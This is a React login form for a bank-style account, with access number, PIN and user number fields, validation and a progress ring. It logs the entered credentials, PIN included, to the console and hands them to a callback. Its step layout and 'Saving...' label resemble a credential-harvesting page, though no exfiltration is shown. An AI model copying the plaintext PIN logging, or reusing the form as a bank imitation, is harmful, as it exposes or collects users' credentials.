import React, { useState } from 'react';
import { ChevronRight, Info, FileText } from 'lucide-react';


export default function LoginForm({ onSubmit }) {
  const [accessNumber, setAccessNumber] = useState('');
  const [pin, setPin] = useState('');
  const [userNumber, setUserNumber] = useState('1');
  const [showTooltip, setShowTooltip] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const handleAccessNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length <= 16) {
      setAccessNumber(value);
    }
  };

  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length <= 5) {
      setPin(value);
    }
  };

  const handleNext = async () => {
    const newErrors = {};
    
    if (!accessNumber) {
      newErrors.accessNumber = 'Access number is required';
    } else if (accessNumber.length < 9 || accessNumber.length > 16) {
      newErrors.accessNumber = 'Please enter a valid account number (9-16 digits)';
    }
    
    if (!pin) {
      newErrors.pin = 'PIN is required';
    } else if (pin.length < 4 || pin.length > 5) {
      newErrors.pin = 'Please enter a valid PIN (4-5 digits)';
    }
    
    if (!userNumber) {
      newErrors.userNumber = 'Please enter your user number';
    }
    
    setErrors(newErrors);
    
    if (Object.keys(newErrors).length > 0) {
      return;
    }

    const loginData = {
      accessNumber,
      pin,
      userNumber,
      timestamp: new Date().toISOString()
    };
    
    console.log('Login data:', loginData);
    setIsLoading(true);
    
    setIsLoading(false);
    if (onSubmit) {
      onSubmit(loginData);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-sm p-6 lg:p-8">
      <div className="flex items-center gap-3 mb-6">
        <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center relative">
          <FileText size={24} className="text-gray-400" />
          {/* 33% progress ring around the icon */}
          <svg className="absolute inset-0 w-12 h-12 transform -rotate-90" viewBox="0 0 48 48">
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#e5e7eb"
              strokeWidth="4"
            />
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#dc2626"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray={`${2 * Math.PI * 20 * 0.33} ${2 * Math.PI * 20}`}
            />
          </svg>
        </div>
      </div>

      <h2 className="text-2xl font-semibold mb-4">Login details</h2>
      
      <div className="flex gap-6 mb-6 text-sm text-gray-600">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center">
            <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
          </div>
          <span>Password</span>
        </div>
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center">
            <ChevronRight size={12} />
          </div>
          <span>Log in</span>
        </div>
      </div>

      <div className="bg-gray-50 p-4 rounded mb-6 text-sm text-gray-700">
        Never share your login details with anyone
      </div>

      <div>
        <div className="mb-4">
          <label className="block text-sm font-medium mb-2">
            Access account number
          </label>
          <input
            type="text"
            value={accessNumber}
            onChange={handleAccessNumberChange}
            onKeyPress={handleKeyPress}
            className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
              errors.accessNumber ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
            }`}
            placeholder=""
            maxLength={16}
          />
          {errors.accessNumber && (
            <p className="text-xs text-red-500 mt-1">{errors.accessNumber}</p>
          )}
        </div>

        <div className="mb-4">
          <label className="block text-sm font-medium mb-2">PIN</label>
          <input
            type="password"
            value={pin}
            onChange={handlePinChange}
            onKeyPress={handleKeyPress}
            className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
              errors.pin ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
            }`}
            placeholder=""
            maxLength={5}
          />
          {errors.pin && (
            <p className="text-xs text-red-500 mt-1">{errors.pin}</p>
          )}
        </div>

        <div className="mb-6 relative">
          <label className="block text-sm font-medium mb-2 flex items-center gap-2">
            User number
            <button
              type="button"
              onMouseEnter={() => setShowTooltip(true)}
              onMouseLeave={() => setShowTooltip(false)}
              onClick={() => setShowTooltip(!showTooltip)}
              className="text-blue-500 hover:text-blue-700"
            >
              <Info size={16} />
            </button>
          </label>
          {showTooltip && (
            <div className="absolute left-20 top-0 bg-gray-800 text-white text-xs p-2 rounded shadow-lg z-10 w-48">
              Your user number helps identify your profile
            </div>
          )}
          <input
            type="text"
            value={userNumber}
            onChange={(e) => setUserNumber(e.target.value)}
            onKeyPress={handleKeyPress}
            className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
              errors.userNumber ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
            }`}
          />
          {errors.userNumber && (
            <p className="text-xs text-red-500 mt-1">{errors.userNumber}</p>
          )}
        </div>

        <button
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-semibold py-3 rounded transition-colors mb-4"
        >
          {isLoading ? 'Saving...' : 'Next'}
        </button>

        <button
          type="button"
          className="w-full border-2 border-orange-500 text-orange-500 hover:bg-orange-50 font-semibold py-3 rounded transition-colors"
        >
          Forgot PIN?
        </button>
      </div>
    </div>
  );
}